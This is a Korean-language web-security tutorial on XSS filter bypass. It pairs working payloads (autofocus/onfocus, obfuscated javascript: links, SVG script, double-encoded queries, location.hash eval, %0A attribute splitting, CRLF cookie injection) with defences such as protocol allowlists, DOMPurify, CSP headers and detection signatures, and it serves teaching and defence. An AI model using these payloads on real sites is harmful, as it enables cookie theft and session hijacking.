---
title: "[Infosec] XSS 필터링 우회 : 개념·우회 패턴·실전 대응"
date: 2025-09-16 12:40:00 +0900
categories: [보안, Web]
tags: [웹해킹, XSS, FilteringBypass, Encoding, URL, SVG, TemplateInjection, CSP]
description: "XSS 필터링을 우회해보자"
author: "송지민"
toc: true
---
> ⚠️ 학습/방어 목적 문서입니다. 테스트는 반드시 본인 환경(로컬/CTF)에서만 진행하세요.

---

## 요약
이 문서는 **잘못된(deny/naive) 필터링**에 대한 우회 기법을 모아 정리한 보강판입니다.  
추가된 내용: **SVG XSS, React/Angular 템플릿 주입(간단히), CSP 실전 설정 예시, Burp/탐지 체크리스트**를 포함합니다.

핵심: **검증 → 정규화 → 컨텍스트별 인코딩** 이 가장 안전하고 실무 적용 우선순위입니다.

---

## 1. 이벤트 핸들러(on*) — 요점 및 우회 기법
- 이벤트 핸들러 속성(onload/onerror/onfocus 등)은 HTML 속성 컨텍스트에서 그대로 실행될 수 있음.
- 방어 실패 사례: 단순히 `<script>` 태그와 `onerror` 문자열을 금지하는 필터.
- 우회 포인트:
  - 속성 이름을 분할/재조합 또는 중복 삽입으로 복원 (`oneonerrorrror` → `onerror` 재조합)
  - `autofocus`, `tabindex` 등으로 자동 트리거
  - `iframe srcdoc`/`innerHTML`을 통해 이벤트 핸들러 주입

예시:
```html
<input id="x" autofocus onfocus="alert(document.cookie)">
<iframe srcdoc="&lt;img src=1 onerror=alert(document.domain)&gt;"></iframe>
```

---

## 2. 문자열 치환/반복 치환의 한계
- 반복적으로 `replace()` 하더라도 예상치 못한 중첩/중간 문자열을 이용해 키워드를 복원 가능.
- 결론: **키워드 제거는 디펜스 아키텍처로 부적합**.  
  항상 **출력 컨텍스트**에 맞춘 이스케이프가 정답.

---

## 3. 활성 하이퍼링크(`javascript:`) 정규화 우회
- 브라우저는 다양한 escape/encoding을 정규화함.
- 방어: 정규화(`new URL(x, base)`) 후 `protocol` 비교. 그러나 오래된 브라우저/기기 차이 고려 필요.
- 권장: 프로토콜 화이트리스트(`http(s)`만 허용).

우회 예시:
```html
<a href="\1\4jAVasC\triPT:alert(1)">x</a>
```

방어 코드(예시):
```js
try {
  const u = new URL(userHref, document.baseURI);
  if (u.protocol !== 'http:' && u.protocol !== 'https:') throw 'bad';
} catch(e){ /* reject */ }
```

---

## 4. 태그·속성 기반 필터의 우회 (대/소문자, 줄바꿈, 대체 태그)
- HTML은 대소문자 구분 없음, 속성은 공백/줄바꿈으로 분리 가능.
- `on*` 검사에서 줄바꿈/탭 `\n`으로 우회 가능.
- 대체 태그(`video`, `source`, `svg`, `math`, `iframe`)로 우회 가능.

예시 우회:
```html
<img src="" 
onerror="alert(1)">
<video><source onerror="alert(1)"/></video>
```

---

## 5. SVG XSS
- `<svg>`과 그 내부 태그(`<foreignObject>`, `<script>`, `<image onerror=...>`)는 자주 간과됨.
- SVG은 XML 네임스페이스와 폰트/외부 리소스 로딩을 허용하므로 공격면이 큼.

예시:
```html
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.domain)</script>
</svg>
```
또는:
```html
<svg><image href="invalid" onerror="alert(1)"></image></svg>
```

방어 팁:
- SVG를 사용자 업로드로 허용할 때는 **완전 샌드박스 처리(렌더되지 않게, 또는 스크립트 제거)** 하거나 **content-disposition: attachment**로 강제 다운로드.
- SVG 파서로 허용 태그/속성만 필터링. (화이트리스트 방식)

---

## 6. React / Angular / Template Injection
- **React**: JSX `dangerouslySetInnerHTML`를 쓰지 않으면 보통 안전. 그러나 서버에서 렌더된 HTML을 React가 innerHTML로 넣거나, 서버 템플릿에서 치환 없이 출력하면 문제.
- **Angular**: 바인딩 컨텍스트(`[]`, `()`)와 `innerHTML` 사용 주의. Angular는 자체 sanitizer를 제공하지만, `bypassSecurityTrustHtml`은 위험.
- **서버 템플릿 주입**: 서버 템플릿 엔진(예: ejs, nunjucks, jinja2)에서 autoescape를 끈 경우 위험.

권장:
- 프레임워크 기본 escaping 사용. 서버에서 렌더할 때도 템플릿의 autoescape 켜기.
- 사용자 HTML을 꼭 허용해야 하면, **DOMPurify** 같은 검증된 라이브러리로 정화.

---

## 7. JS 언어 특성 기반 우회
- Unicode escape, `String.fromCharCode`, computed member access (`document['coo'+'kie']`), 숫자→36진수 등.
- 극단적: **JSFuck** 같은 방식으로 키워드 없이도 동작한다 (길지만 우회 가능).

예시:
```js
window['al'+'ert'](document['coo'+'kie']);
```
또는:
```js
String.fromCharCode(97,108,101,114,116) // "alert"
```

---

## 8. 디코딩 전/후 검증(더블 디코딩) 문제
- 원칙: **입력은 정규화(디코딩) → 검증 → 저장**의 순으로 한 번만 처리.
- 실수 사례: 검증은 인코딩된 상태에서, 실제 사용은 디코딩 상태에서 이루어짐 → 우회 가능.

예시 공격:
```
/search?query=%253Cscript%253Ealert(1)%253C/script%253E
```

방어: 서버에서 수신한 모든 URL 인자에 대해 `decodeURIComponent` 동일 횟수로 적용한 뒤 검사.

---

## 9. 길이 제한/분할 저장 우회
- 제한된 입력 길이를 회피하려면 페이로드를 여러 공간(해시/쿠키/localStorage/외부 스크립트)으로 분산.
- 常用 기법: `location.hash` + `eval(location.hash.slice(1))` (eval은 최대한 금지)

예시:
```
https://victim/?q=<img onerror="eval(location.hash.slice(1))">#alert(document.cookie)
```

---

## 10. CSP(Content Security Policy) 실전 예시
- CSP은 XSS 피해 규모를 줄이는 강력한 수단. 예시 헤더:
```
Content-Security-Policy: default-src 'none'; script-src 'self' 'sha256-<HASH>'; object-src 'none'; base-uri 'self'; frame-ancestors 'none';
```
- nonce 기반 또는 해시 기반 정책 권장 (`'nonce-...'` 또는 `'sha256-...'`)  
- 주의: `unsafe-inline` 과 `unsafe-eval` 은 피해 감소 효과를 없애므로 사용 금지.

---

## 11. 탐지·테스트 체크리스트 (Burp/자동화)
- 시그니처: `onerror=`, `onload=`, `<script`, `<svg`, `srcdoc=`, `javascript:`
- 정규화 후 검사: `new URL(payload, base)`를 사용해 `protocol`/`host` 검증
- 자동투입 페이로드: 다양한 인코딩(`%25`, `%09`, `%0A`, `%0D`, `\x`, `\u`)과 대소문자 변형
- Burp Intruder Payloads: JSFuck snippets, SVG payloads, event-handler snippets, template injection markers (`{{ }}`, `<% %>`)
- 탐지 로그: 입력 저장시의 원본+정규화된 값 모두 로깅

---

## 12. 제어문자 / 퍼센트-인코딩 (`%09`, `%0A`, `%08` 등)
### 왜 중요한가?
퍼센트로 인코딩된 제어문자(예: `%09` 탭, `%0A` LF, `%0D` CR, `%00` NUL, `%08` BS 등)는 디코딩·정규화 과정에서 제거되거나 공백으로 바뀌어 필터를 우회할 수 있습니다. 특히 URL 스킴, 속성 분리, HTTP 헤더 조작(CRLF)에서 큰 위협.

### 공격 예시
- `ja%09vascript:alert(1)` → 일부 정규화에서 `javascript:`로 복구
- 속성 분리: `<img src="x"%0Aonerror=alert(1)>`
- 헤더 주입: `Set-Cookie: x=1%0D%0ASet-Cookie: hacked=1` (잘못 처리 시)